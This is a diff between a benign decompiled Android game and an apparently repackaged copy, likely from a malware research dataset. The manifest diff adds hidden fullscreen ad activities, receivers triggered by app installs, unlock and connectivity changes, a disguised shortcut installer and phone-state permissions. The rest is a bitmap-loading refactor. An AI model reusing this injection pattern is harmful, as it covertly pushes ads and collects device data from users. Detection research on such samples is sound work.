@@ -1,0 +1,702 @@
+diff -r result/APP_13/App_B_13/AndroidManifest.xml result/APP_13/App_M_13/AndroidManifest.xml
+8a9,40
+>         <meta-data android:name="ZHUAMOB_APPKEY" android:value="86b288393f8c4ed3fae4bdc6"/>
+>         <activity android:launchMode="singleInstance" android:name="com.anzhi.ad.coverscreen.SA" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"/>
+>         <activity android:launchMode="singleInstance" android:name="com.anzhi.ad.coverscreen.WA"/>
+>         <receiver android:name="com.anzhi.ad.coverscreen.SR">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>                 <action android:name="broadcast.route.control"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.unity3d.plugin.unity.ts.ModsnActivity" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.unity3d.plugin.unity.ts.NaintActivity"/>
+>         <receiver android:name="com.unity3d.plugin.unity.ts.TsownActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+12a45,46
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+13a48,50
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+diff -r result/APP_13/App_B_13/apktool.yml result/APP_13/App_M_13/apktool.yml
+2c2
+< apkFileName: Bapp13-1D87BE8574AD949E1C2A2D1FFF6CF5D47A502F0AC43101C9ABDE280CC30A88F8.apk
+---
+> apkFileName: Mapp13-2554832478D000C4836F508A41783E40888F6999486108FFDD4C12F93A8C8853.apk
+6d5
+< - mp3
+7a7,9
+> - res/drawable-hdpi/upgrade_lueur_pistons_power.PNG
+> - res/drawable-hdpi/star_or.PNG
+> - res/drawable-hdpi/star_bronze.PNG
+10,14d11
+< - res/drawable-hdpi/star_bronze.PNG
+< - res/drawable-hdpi/star_or.PNG
+< - res/drawable-hdpi/upgrade_lueur_pistons_power.PNG
+< - res/drawable-ldpi/menu_button_duration.PNG
+< - res/drawable-ldpi/star_argent.PNG
+16d12
+< - res/drawable-ldpi/star_or.PNG
+17a14,18
+> - res/drawable-ldpi/star_or.PNG
+> - res/drawable-ldpi/star_argent.PNG
+> - res/drawable-ldpi/menu_button_duration.PNG
+> - res/drawable-mdpi/star_or.PNG
+> - res/drawable-mdpi/upgrade_lueur_pistons_power.PNG
+21,22c22,23
+< - res/drawable-mdpi/star_or.PNG
+< - res/drawable-mdpi/upgrade_lueur_pistons_power.PNG
+---
+> - mp3
+> - assets/Zhuamob_sdk_v1.8.2.version
+Somente em result/APP_13/App_M_13/assets: l
+Somente em result/APP_13/App_M_13/assets: Zhuamob_sdk_v1.8.2.version
+Somente em result/APP_13/App_M_13/com: anzhi
+Somente em result/APP_13/App_M_13/com/google/ads: GoogleActivity.java
+diff -r result/APP_13/App_B_13/com/SAXapp/model/ImgBall.java result/APP_13/App_M_13/com/SAXapp/model/ImgBall.java
+20,230c20,114
+<     paramTypeface = paramImageManager.getBitmap(2130837508);
+<     Bitmap localBitmap1 = paramImageManager.getBitmap(2130837509);
+<     Bitmap localBitmap2 = paramImageManager.getBitmap(2130837510);
+<     Bitmap localBitmap3 = paramImageManager.getBitmap(2130837511);
+<     Bitmap localBitmap4 = paramImageManager.getBitmap(2130837512);
+<     Bitmap localBitmap5 = paramImageManager.getBitmap(2130837513);
+<     Bitmap localBitmap6 = paramImageManager.getBitmap(2130837514);
+<     Bitmap localBitmap7 = paramImageManager.getBitmap(2130837515);
+<     Bitmap localBitmap8 = paramImageManager.getBitmap(2130837516);
+<     Bitmap localBitmap9 = paramImageManager.getBitmap(2130837517);
+<     Bitmap localBitmap10 = paramImageManager.getBitmap(2130837518);
+<     Bitmap localBitmap11 = paramImageManager.getBitmap(2130837519);
+<     Bitmap localBitmap12 = paramImageManager.getBitmap(2130837520);
+<     Bitmap localBitmap13 = paramImageManager.getBitmap(2130837521);
+<     Bitmap localBitmap14 = paramImageManager.getBitmap(2130837522);
+<     Bitmap localBitmap15 = paramImageManager.getBitmap(2130837523);
+<     Bitmap localBitmap16 = paramImageManager.getBitmap(2130837524);
+<     Bitmap localBitmap17 = paramImageManager.getBitmap(2130837525);
+<     Bitmap localBitmap18 = paramImageManager.getBitmap(2130837526);
+<     Bitmap localBitmap19 = paramImageManager.getBitmap(2130837527);
+<     Bitmap localBitmap20 = paramImageManager.getBitmap(2130837528);
+<     Bitmap localBitmap21 = paramImageManager.getBitmap(2130837529);
+<     Bitmap localBitmap22 = paramImageManager.getBitmap(2130837530);
+<     Bitmap localBitmap23 = paramImageManager.getBitmap(2130837531);
+<     Bitmap localBitmap24 = paramImageManager.getBitmap(2130837532);
+<     Bitmap localBitmap25 = paramImageManager.getBitmap(2130837533);
+<     Bitmap localBitmap26 = paramImageManager.getBitmap(2130837534);
+<     Bitmap localBitmap27 = paramImageManager.getBitmap(2130837535);
+<     Bitmap localBitmap28 = paramImageManager.getBitmap(2130837536);
+<     Bitmap localBitmap29 = paramImageManager.getBitmap(2130837537);
+<     Bitmap localBitmap30 = paramImageManager.getBitmap(2130837538);
+<     Bitmap localBitmap31 = paramImageManager.getBitmap(2130837539);
+<     Bitmap localBitmap32 = paramImageManager.getBitmap(2130837540);
+<     Bitmap localBitmap33 = paramImageManager.getBitmap(2130837541);
+<     Bitmap localBitmap34 = paramImageManager.getBitmap(2130837542);
+<     Bitmap localBitmap35 = paramImageManager.getBitmap(2130837543);
+<     Bitmap localBitmap36 = paramImageManager.getBitmap(2130837544);
+<     Bitmap localBitmap37 = paramImageManager.getBitmap(2130837545);
+<     Bitmap localBitmap38 = paramImageManager.getBitmap(2130837546);
+<     Bitmap localBitmap39 = paramImageManager.getBitmap(2130837547);
+<     Bitmap localBitmap40 = paramImageManager.getBitmap(2130837548);
+<     Bitmap localBitmap41 = paramImageManager.getBitmap(2130837549);
+<     Bitmap localBitmap42 = paramImageManager.getBitmap(2130837550);
+<     Bitmap localBitmap43 = paramImageManager.getBitmap(2130837551);
+<     Bitmap localBitmap44 = paramImageManager.getBitmap(2130837552);
+<     Bitmap localBitmap45 = paramImageManager.getBitmap(2130837553);
+<     Bitmap localBitmap46 = paramImageManager.getBitmap(2130837554);
+<     Bitmap localBitmap47 = paramImageManager.getBitmap(2130837555);
+<     Bitmap localBitmap48 = paramImageManager.getBitmap(2130837556);
+<     Bitmap localBitmap49 = paramImageManager.getBitmap(2130837557);
+<     Bitmap localBitmap50 = paramImageManager.getBitmap(2130837558);
+<     Bitmap localBitmap51 = paramImageManager.getBitmap(2130837559);
+<     Bitmap localBitmap52 = paramImageManager.getBitmap(2130837560);
+<     Bitmap localBitmap53 = paramImageManager.getBitmap(2130837561);
+<     Bitmap localBitmap54 = paramImageManager.getBitmap(2130837562);
+<     Bitmap localBitmap55 = paramImageManager.getBitmap(2130837563);
+<     Bitmap localBitmap56 = paramImageManager.getBitmap(2130837564);
+<     Bitmap localBitmap57 = paramImageManager.getBitmap(2130837565);
+<     Bitmap localBitmap58 = paramImageManager.getBitmap(2130837566);
+<     Bitmap localBitmap59 = paramImageManager.getBitmap(2130837567);
+<     Bitmap localBitmap60 = paramImageManager.getBitmap(2130837568);
+<     Bitmap localBitmap61 = paramImageManager.getBitmap(2130837569);
+<     Bitmap localBitmap62 = paramImageManager.getBitmap(2130837570);
+<     Bitmap localBitmap63 = paramImageManager.getBitmap(2130837571);
+<     Bitmap localBitmap64 = paramImageManager.getBitmap(2130837572);
+<     Bitmap localBitmap65 = paramImageManager.getBitmap(2130837573);
+<     Bitmap localBitmap66 = paramImageManager.getBitmap(2130837574);
+<     Bitmap localBitmap67 = paramImageManager.getBitmap(2130837575);
+<     Bitmap localBitmap68 = paramImageManager.getBitmap(2130837576);
+<     Bitmap localBitmap69 = paramImageManager.getBitmap(2130837577);
+<     Bitmap localBitmap70 = paramImageManager.getBitmap(2130837578);
+<     Bitmap localBitmap71 = paramImageManager.getBitmap(2130837579);
+<     Bitmap localBitmap72 = paramImageManager.getBitmap(2130837580);
+<     Bitmap localBitmap73 = paramImageManager.getBitmap(2130837581);
+<     Bitmap localBitmap74 = paramImageManager.getBitmap(2130837582);
+<     Bitmap localBitmap75 = paramImageManager.getBitmap(2130837583);
+<     Bitmap localBitmap76 = paramImageManager.getBitmap(2130837584);
+<     Bitmap localBitmap77 = paramImageManager.getBitmap(2130837585);
+<     Bitmap localBitmap78 = paramImageManager.getBitmap(2130837586);
+<     Bitmap localBitmap79 = paramImageManager.getBitmap(2130837587);
+<     Bitmap localBitmap80 = paramImageManager.getBitmap(2130837588);
+<     Bitmap localBitmap81 = paramImageManager.getBitmap(2130837589);
+<     Bitmap localBitmap82 = paramImageManager.getBitmap(2130837590);
+<     Bitmap localBitmap83 = paramImageManager.getBitmap(2130837591);
+<     Bitmap localBitmap84 = paramImageManager.getBitmap(2130837592);
+<     Bitmap localBitmap85 = paramImageManager.getBitmap(2130837593);
+<     Bitmap localBitmap86 = paramImageManager.getBitmap(2130837594);
+<     Bitmap localBitmap87 = paramImageManager.getBitmap(2130837595);
+<     Bitmap localBitmap88 = paramImageManager.getBitmap(2130837596);
+<     Bitmap localBitmap89 = paramImageManager.getBitmap(2130837597);
+<     Bitmap localBitmap90 = paramImageManager.getBitmap(2130837628);
+<     Bitmap localBitmap91 = paramImageManager.getBitmap(2130837629);
+<     Bitmap localBitmap92 = paramImageManager.getBitmap(2130837630);
+<     Bitmap localBitmap93 = paramImageManager.getBitmap(2130837631);
+<     Bitmap localBitmap94 = paramImageManager.getBitmap(2130837632);
+<     Bitmap localBitmap95 = paramImageManager.getBitmap(2130837633);
+<     Bitmap localBitmap96 = paramImageManager.getBitmap(2130837634);
+<     Bitmap localBitmap97 = paramImageManager.getBitmap(2130837635);
+<     Bitmap localBitmap98 = paramImageManager.getBitmap(2130837636);
+<     Bitmap localBitmap99 = paramImageManager.getBitmap(2130837637);
+<     Bitmap localBitmap100 = paramImageManager.getBitmap(2130837638);
+<     Bitmap localBitmap101 = paramImageManager.getBitmap(2130837639);
+<     Bitmap localBitmap102 = paramImageManager.getBitmap(2130837640);
+<     Bitmap localBitmap103 = paramImageManager.getBitmap(2130837641);
+<     Bitmap localBitmap104 = paramImageManager.getBitmap(2130837642);
+<     Bitmap localBitmap105 = paramImageManager.getBitmap(2130837643);
+<     Bitmap localBitmap106 = paramImageManager.getBitmap(2130837644);
+<     Bitmap localBitmap107 = paramImageManager.getBitmap(2130837645);
+<     Bitmap localBitmap108 = paramImageManager.getBitmap(2130837646);
+<     Bitmap localBitmap109 = paramImageManager.getBitmap(2130837647);
+<     Bitmap localBitmap110 = paramImageManager.getBitmap(2130837648);
+<     Bitmap localBitmap111 = paramImageManager.getBitmap(2130837649);
+<     Bitmap localBitmap112 = paramImageManager.getBitmap(2130837650);
+<     Bitmap localBitmap113 = paramImageManager.getBitmap(2130837651);
+<     Bitmap localBitmap114 = paramImageManager.getBitmap(2130837652);
+<     Bitmap localBitmap115 = paramImageManager.getBitmap(2130837653);
+<     Bitmap localBitmap116 = paramImageManager.getBitmap(2130837654);
+<     Bitmap localBitmap117 = paramImageManager.getBitmap(2130837655);
+<     Bitmap localBitmap118 = paramImageManager.getBitmap(2130837656);
+<     Bitmap localBitmap119 = paramImageManager.getBitmap(2130837657);
+<     Bitmap localBitmap120 = paramImageManager.getBitmap(2130837598);
+<     Bitmap localBitmap121 = paramImageManager.getBitmap(2130837599);
+<     Bitmap localBitmap122 = paramImageManager.getBitmap(2130837600);
+<     Bitmap localBitmap123 = paramImageManager.getBitmap(2130837601);
+<     Bitmap localBitmap124 = paramImageManager.getBitmap(2130837602);
+<     Bitmap localBitmap125 = paramImageManager.getBitmap(2130837603);
+<     Bitmap localBitmap126 = paramImageManager.getBitmap(2130837604);
+<     Bitmap localBitmap127 = paramImageManager.getBitmap(2130837605);
+<     Bitmap localBitmap128 = paramImageManager.getBitmap(2130837606);
+<     Bitmap localBitmap129 = paramImageManager.getBitmap(2130837607);
+<     Bitmap localBitmap130 = paramImageManager.getBitmap(2130837608);
+<     Bitmap localBitmap131 = paramImageManager.getBitmap(2130837609);
+<     Bitmap localBitmap132 = paramImageManager.getBitmap(2130837610);
+<     Bitmap localBitmap133 = paramImageManager.getBitmap(2130837611);
+<     Bitmap localBitmap134 = paramImageManager.getBitmap(2130837612);
+<     Bitmap localBitmap135 = paramImageManager.getBitmap(2130837613);
+<     Bitmap localBitmap136 = paramImageManager.getBitmap(2130837614);
+<     Bitmap localBitmap137 = paramImageManager.getBitmap(2130837615);
+<     Bitmap localBitmap138 = paramImageManager.getBitmap(2130837616);
+<     Bitmap localBitmap139 = paramImageManager.getBitmap(2130837617);
+<     Bitmap localBitmap140 = paramImageManager.getBitmap(2130837618);
+<     Bitmap localBitmap141 = paramImageManager.getBitmap(2130837619);
+<     Bitmap localBitmap142 = paramImageManager.getBitmap(2130837620);
+<     Bitmap localBitmap143 = paramImageManager.getBitmap(2130837621);
+<     Bitmap localBitmap144 = paramImageManager.getBitmap(2130837622);
+<     Bitmap localBitmap145 = paramImageManager.getBitmap(2130837623);
+<     Bitmap localBitmap146 = paramImageManager.getBitmap(2130837624);
+<     Bitmap localBitmap147 = paramImageManager.getBitmap(2130837625);
+<     Bitmap localBitmap148 = paramImageManager.getBitmap(2130837626);
+<     Bitmap localBitmap149 = paramImageManager.getBitmap(2130837627);
+<     Bitmap localBitmap150 = paramImageManager.getBitmap(2130837658);
+<     Bitmap localBitmap151 = paramImageManager.getBitmap(2130837659);
+<     Bitmap localBitmap152 = paramImageManager.getBitmap(2130837660);
+<     Bitmap localBitmap153 = paramImageManager.getBitmap(2130837661);
+<     Bitmap localBitmap154 = paramImageManager.getBitmap(2130837662);
+<     Bitmap localBitmap155 = paramImageManager.getBitmap(2130837663);
+<     Bitmap localBitmap156 = paramImageManager.getBitmap(2130837664);
+<     Bitmap localBitmap157 = paramImageManager.getBitmap(2130837665);
+<     Bitmap localBitmap158 = paramImageManager.getBitmap(2130837666);
+<     Bitmap localBitmap159 = paramImageManager.getBitmap(2130837667);
+<     Bitmap localBitmap160 = paramImageManager.getBitmap(2130837668);
+<     Bitmap localBitmap161 = paramImageManager.getBitmap(2130837669);
+<     Bitmap localBitmap162 = paramImageManager.getBitmap(2130837670);
+<     Bitmap localBitmap163 = paramImageManager.getBitmap(2130837671);
+<     Bitmap localBitmap164 = paramImageManager.getBitmap(2130837672);
+<     Bitmap localBitmap165 = paramImageManager.getBitmap(2130837673);
+<     Bitmap localBitmap166 = paramImageManager.getBitmap(2130837674);
+<     Bitmap localBitmap167 = paramImageManager.getBitmap(2130837675);
+<     Bitmap localBitmap168 = paramImageManager.getBitmap(2130837676);
+<     Bitmap localBitmap169 = paramImageManager.getBitmap(2130837677);
+<     Bitmap localBitmap170 = paramImageManager.getBitmap(2130837678);
+<     Bitmap localBitmap171 = paramImageManager.getBitmap(2130837679);
+<     Bitmap localBitmap172 = paramImageManager.getBitmap(2130837680);
+<     Bitmap localBitmap173 = paramImageManager.getBitmap(2130837681);
+<     Bitmap localBitmap174 = paramImageManager.getBitmap(2130837682);
+<     Bitmap localBitmap175 = paramImageManager.getBitmap(2130837683);
+<     Bitmap localBitmap176 = paramImageManager.getBitmap(2130837684);
+<     Bitmap localBitmap177 = paramImageManager.getBitmap(2130837685);
+<     Bitmap localBitmap178 = paramImageManager.getBitmap(2130837686);
+<     Bitmap localBitmap179 = paramImageManager.getBitmap(2130837687);
+<     Bitmap localBitmap180 = paramImageManager.getBitmap(2130837658);
+<     Bitmap localBitmap181 = paramImageManager.getBitmap(2130837659);
+<     Bitmap localBitmap182 = paramImageManager.getBitmap(2130837660);
+<     Bitmap localBitmap183 = paramImageManager.getBitmap(2130837661);
+<     Bitmap localBitmap184 = paramImageManager.getBitmap(2130837662);
+<     Bitmap localBitmap185 = paramImageManager.getBitmap(2130837663);
+<     Bitmap localBitmap186 = paramImageManager.getBitmap(2130837664);
+<     Bitmap localBitmap187 = paramImageManager.getBitmap(2130837665);
+<     Bitmap localBitmap188 = paramImageManager.getBitmap(2130837666);
+<     Bitmap localBitmap189 = paramImageManager.getBitmap(2130837667);
+<     Bitmap localBitmap190 = paramImageManager.getBitmap(2130837668);
+<     Bitmap localBitmap191 = paramImageManager.getBitmap(2130837669);
+<     Bitmap localBitmap192 = paramImageManager.getBitmap(2130837670);
+<     Bitmap localBitmap193 = paramImageManager.getBitmap(2130837671);
+<     Bitmap localBitmap194 = paramImageManager.getBitmap(2130837672);
+<     Bitmap localBitmap195 = paramImageManager.getBitmap(2130837673);
+<     Bitmap localBitmap196 = paramImageManager.getBitmap(2130837674);
+<     Bitmap localBitmap197 = paramImageManager.getBitmap(2130837675);
+<     Bitmap localBitmap198 = paramImageManager.getBitmap(2130837676);
+<     Bitmap localBitmap199 = paramImageManager.getBitmap(2130837677);
+<     Bitmap localBitmap200 = paramImageManager.getBitmap(2130837678);
+<     Bitmap localBitmap201 = paramImageManager.getBitmap(2130837679);
+<     Bitmap localBitmap202 = paramImageManager.getBitmap(2130837680);
+<     Bitmap localBitmap203 = paramImageManager.getBitmap(2130837681);
+<     Bitmap localBitmap204 = paramImageManager.getBitmap(2130837682);
+<     Bitmap localBitmap205 = paramImageManager.getBitmap(2130837683);
+<     Bitmap localBitmap206 = paramImageManager.getBitmap(2130837684);
+<     Bitmap localBitmap207 = paramImageManager.getBitmap(2130837685);
+<     Bitmap localBitmap208 = paramImageManager.getBitmap(2130837686);
+<     Bitmap localBitmap209 = paramImageManager.getBitmap(2130837687);
+<     this.imgBall2 = new Bitmap[][] { { paramTypeface, localBitmap1, localBitmap2, localBitmap3, localBitmap4, localBitmap5, localBitmap6, localBitmap7, localBitmap8, localBitmap9, localBitmap10, localBitmap11, localBitmap12, localBitmap13, localBitmap14, localBitmap15, localBitmap16, localBitmap17, localBitmap18, localBitmap19, localBitmap20, localBitmap21, localBitmap22, localBitmap23, localBitmap24, localBitmap25, localBitmap26, localBitmap27, localBitmap28, localBitmap29 }, { localBitmap30, localBitmap31, localBitmap32, localBitmap33, localBitmap34, localBitmap35, localBitmap36, localBitmap37, localBitmap38, localBitmap39, localBitmap40, localBitmap41, localBitmap42, localBitmap43, localBitmap44, localBitmap45, localBitmap46, localBitmap47, localBitmap48, localBitmap49, localBitmap50, localBitmap51, localBitmap52, localBitmap53, localBitmap54, localBitmap55, localBitmap56, localBitmap57, localBitmap58, localBitmap59 }, { localBitmap60, localBitmap61, localBitmap62, localBitmap63, localBitmap64, localBitmap65, localBitmap66, localBitmap67, localBitmap68, localBitmap69, localBitmap70, localBitmap71, localBitmap72, localBitmap73, localBitmap74, localBitmap75, localBitmap76, localBitmap77, localBitmap78, localBitmap79, localBitmap80, localBitmap81, localBitmap82, localBitmap83, localBitmap84, localBitmap85, localBitmap86, localBitmap87, localBitmap88, localBitmap89 }, { localBitmap90, localBitmap91, localBitmap92, localBitmap93, localBitmap94, localBitmap95, localBitmap96, localBitmap97, localBitmap98, localBitmap99, localBitmap100, localBitmap101, localBitmap102, localBitmap103, localBitmap104, localBitmap105, localBitmap106, localBitmap107, localBitmap108, localBitmap109, localBitmap110, localBitmap111, localBitmap112, localBitmap113, localBitmap114, localBitmap115, localBitmap116, localBitmap117, localBitmap118, localBitmap119 }, { localBitmap120, localBitmap121, localBitmap122, localBitmap123, localBitmap124, localBitmap125, localBitmap126, localBitmap127, localBitmap128, localBitmap129, localBitmap130, localBitmap131, localBitmap132, localBitmap133, localBitmap134, localBitmap135, localBitmap136, localBitmap137, localBitmap138, localBitmap139, localBitmap140, localBitmap141, localBitmap142, localBitmap143, localBitmap144, localBitmap145, localBitmap146, localBitmap147, localBitmap148, localBitmap149 }, new Bitmap[0], { localBitmap150, localBitmap151, localBitmap152, localBitmap153, localBitmap154, localBitmap155, localBitmap156, localBitmap157, localBitmap158, localBitmap159, localBitmap160, localBitmap161, localBitmap162, localBitmap163, localBitmap164, localBitmap165, localBitmap166, localBitmap167, localBitmap168, localBitmap169, localBitmap170, localBitmap171, localBitmap172, localBitmap173, localBitmap174, localBitmap175, localBitmap176, localBitmap177, localBitmap178, localBitmap179 }, { localBitmap180, localBitmap181, localBitmap182, localBitmap183, localBitmap184, localBitmap185, localBitmap186, localBitmap187, localBitmap188, localBitmap189, localBitmap190, localBitmap191, localBitmap192, localBitmap193, localBitmap194, localBitmap195, localBitmap196, localBitmap197, localBitmap198, localBitmap199, localBitmap200, localBitmap201, localBitmap202, localBitmap203, localBitmap204, localBitmap205, localBitmap206, localBitmap207, localBitmap208, localBitmap209 } };
+---
+>     Bitmap[] arrayOfBitmap1 = { paramImageManager.getBitmap(2130837508), paramImageManager.getBitmap(2130837509), paramImageManager.getBitmap(2130837510), paramImageManager.getBitmap(2130837511), paramImageManager.getBitmap(2130837512), paramImageManager.getBitmap(2130837513), paramImageManager.getBitmap(2130837514), paramImageManager.getBitmap(2130837515), paramImageManager.getBitmap(2130837516), paramImageManager.getBitmap(2130837517), paramImageManager.getBitmap(2130837518), paramImageManager.getBitmap(2130837519), paramImageManager.getBitmap(2130837520), paramImageManager.getBitmap(2130837521), paramImageManager.getBitmap(2130837522), paramImageManager.getBitmap(2130837523), paramImageManager.getBitmap(2130837524), paramImageManager.getBitmap(2130837525), paramImageManager.getBitmap(2130837526), paramImageManager.getBitmap(2130837527), paramImageManager.getBitmap(2130837528), paramImageManager.getBitmap(2130837529), paramImageManager.getBitmap(2130837530), paramImageManager.getBitmap(2130837531), paramImageManager.getBitmap(2130837532), paramImageManager.getBitmap(2130837533), paramImageManager.getBitmap(2130837534), paramImageManager.getBitmap(2130837535), paramImageManager.getBitmap(2130837536), paramImageManager.getBitmap(2130837537) };
+>     Bitmap[] arrayOfBitmap2 = { paramImageManager.getBitmap(2130837538), paramImageManager.getBitmap(2130837539), paramImageManager.getBitmap(2130837540), paramImageManager.getBitmap(2130837541), paramImageManager.getBitmap(2130837542), paramImageManager.getBitmap(2130837543), paramImageManager.getBitmap(2130837544), paramImageManager.getBitmap(2130837545), paramImageManager.getBitmap(2130837546), paramImageManager.getBitmap(2130837547), paramImageManager.getBitmap(2130837548), paramImageManager.getBitmap(2130837549), paramImageManager.getBitmap(2130837550), paramImageManager.getBitmap(2130837551), paramImageManager.getBitmap(2130837552), paramImageManager.getBitmap(2130837553), paramImageManager.getBitmap(2130837554), paramImageManager.getBitmap(2130837555), paramImageManager.getBitmap(2130837556), paramImageManager.getBitmap(2130837557), paramImageManager.getBitmap(2130837558), paramImageManager.getBitmap(2130837559), paramImageManager.getBitmap(2130837560), paramImageManager.getBitmap(2130837561), paramImageManager.getBitmap(2130837562), paramImageManager.getBitmap(2130837563), paramImageManager.getBitmap(2130837564), paramImageManager.getBitmap(2130837565), paramImageManager.getBitmap(2130837566), paramImageManager.getBitmap(2130837567) };
+>     Bitmap[] arrayOfBitmap3 = { paramImageManager.getBitmap(2130837568), paramImageManager.getBitmap(2130837569), paramImageManager.getBitmap(2130837570), paramImageManager.getBitmap(2130837571), paramImageManager.getBitmap(2130837572), paramImageManager.getBitmap(2130837573), paramImageManager.getBitmap(2130837574), paramImageManager.getBitmap(2130837575), paramImageManager.getBitmap(2130837576), paramImageManager.getBitmap(2130837577), paramImageManager.getBitmap(2130837578), paramImageManager.getBitmap(2130837579), paramImageManager.getBitmap(2130837580), paramImageManager.getBitmap(2130837581), paramImageManager.getBitmap(2130837582), paramImageManager.getBitmap(2130837583), paramImageManager.getBitmap(2130837584), paramImageManager.getBitmap(2130837585), paramImageManager.getBitmap(2130837586), paramImageManager.getBitmap(2130837587), paramImageManager.getBitmap(2130837588), paramImageManager.getBitmap(2130837589), paramImageManager.getBitmap(2130837590), paramImageManager.getBitmap(2130837591), paramImageManager.getBitmap(2130837592), paramImageManager.getBitmap(2130837593), paramImageManager.getBitmap(2130837594), paramImageManager.getBitmap(2130837595), paramImageManager.getBitmap(2130837596), paramImageManager.getBitmap(2130837597) };
+>     paramTypeface = paramImageManager.getBitmap(2130837628);
+>     Bitmap localBitmap1 = paramImageManager.getBitmap(2130837629);
+>     Bitmap localBitmap2 = paramImageManager.getBitmap(2130837630);
+>     Bitmap localBitmap3 = paramImageManager.getBitmap(2130837631);
+>     Bitmap localBitmap4 = paramImageManager.getBitmap(2130837632);
+>     Bitmap localBitmap5 = paramImageManager.getBitmap(2130837633);
+>     Bitmap localBitmap6 = paramImageManager.getBitmap(2130837634);
+>     Bitmap localBitmap7 = paramImageManager.getBitmap(2130837635);
+>     Bitmap localBitmap8 = paramImageManager.getBitmap(2130837636);
+>     Bitmap localBitmap9 = paramImageManager.getBitmap(2130837637);
+>     Bitmap localBitmap10 = paramImageManager.getBitmap(2130837638);
+>     Bitmap localBitmap11 = paramImageManager.getBitmap(2130837639);
+>     Bitmap localBitmap12 = paramImageManager.getBitmap(2130837640);
+>     Bitmap localBitmap13 = paramImageManager.getBitmap(2130837641);
+>     Bitmap localBitmap14 = paramImageManager.getBitmap(2130837642);
+>     Bitmap localBitmap15 = paramImageManager.getBitmap(2130837643);
+>     Bitmap localBitmap16 = paramImageManager.getBitmap(2130837644);
+>     Bitmap localBitmap17 = paramImageManager.getBitmap(2130837645);
+>     Bitmap localBitmap18 = paramImageManager.getBitmap(2130837646);
+>     Bitmap localBitmap19 = paramImageManager.getBitmap(2130837647);
+>     Bitmap localBitmap20 = paramImageManager.getBitmap(2130837648);
+>     Bitmap localBitmap21 = paramImageManager.getBitmap(2130837649);
+>     Bitmap localBitmap22 = paramImageManager.getBitmap(2130837650);
+>     Bitmap localBitmap23 = paramImageManager.getBitmap(2130837651);
+>     Bitmap localBitmap24 = paramImageManager.getBitmap(2130837652);
+>     Bitmap localBitmap25 = paramImageManager.getBitmap(2130837653);
+>     Bitmap localBitmap26 = paramImageManager.getBitmap(2130837654);
+>     Bitmap localBitmap27 = paramImageManager.getBitmap(2130837655);
+>     Bitmap localBitmap28 = paramImageManager.getBitmap(2130837656);
+>     Bitmap localBitmap29 = paramImageManager.getBitmap(2130837657);
+>     Bitmap localBitmap30 = paramImageManager.getBitmap(2130837598);
+>     Bitmap localBitmap31 = paramImageManager.getBitmap(2130837599);
+>     Bitmap localBitmap32 = paramImageManager.getBitmap(2130837600);
+>     Bitmap localBitmap33 = paramImageManager.getBitmap(2130837601);
+>     Bitmap localBitmap34 = paramImageManager.getBitmap(2130837602);
+>     Bitmap localBitmap35 = paramImageManager.getBitmap(2130837603);
+>     Bitmap localBitmap36 = paramImageManager.getBitmap(2130837604);
+>     Bitmap localBitmap37 = paramImageManager.getBitmap(2130837605);
+>     Bitmap localBitmap38 = paramImageManager.getBitmap(2130837606);
+>     Bitmap localBitmap39 = paramImageManager.getBitmap(2130837607);
+>     Bitmap localBitmap40 = paramImageManager.getBitmap(2130837608);
+>     Bitmap localBitmap41 = paramImageManager.getBitmap(2130837609);
+>     Bitmap localBitmap42 = paramImageManager.getBitmap(2130837610);
+>     Bitmap localBitmap43 = paramImageManager.getBitmap(2130837611);
+>     Bitmap localBitmap44 = paramImageManager.getBitmap(2130837612);
+>     Bitmap localBitmap45 = paramImageManager.getBitmap(2130837613);
+>     Bitmap localBitmap46 = paramImageManager.getBitmap(2130837614);
+>     Bitmap localBitmap47 = paramImageManager.getBitmap(2130837615);
+>     Bitmap localBitmap48 = paramImageManager.getBitmap(2130837616);
+>     Bitmap localBitmap49 = paramImageManager.getBitmap(2130837617);
+>     Bitmap localBitmap50 = paramImageManager.getBitmap(2130837618);
+>     Bitmap localBitmap51 = paramImageManager.getBitmap(2130837619);
+>     Bitmap localBitmap52 = paramImageManager.getBitmap(2130837620);
+>     Bitmap localBitmap53 = paramImageManager.getBitmap(2130837621);
+>     Bitmap localBitmap54 = paramImageManager.getBitmap(2130837622);
+>     Bitmap localBitmap55 = paramImageManager.getBitmap(2130837623);
+>     Bitmap localBitmap56 = paramImageManager.getBitmap(2130837624);
+>     Bitmap localBitmap57 = paramImageManager.getBitmap(2130837625);
+>     Bitmap localBitmap58 = paramImageManager.getBitmap(2130837626);
+>     Bitmap localBitmap59 = paramImageManager.getBitmap(2130837627);
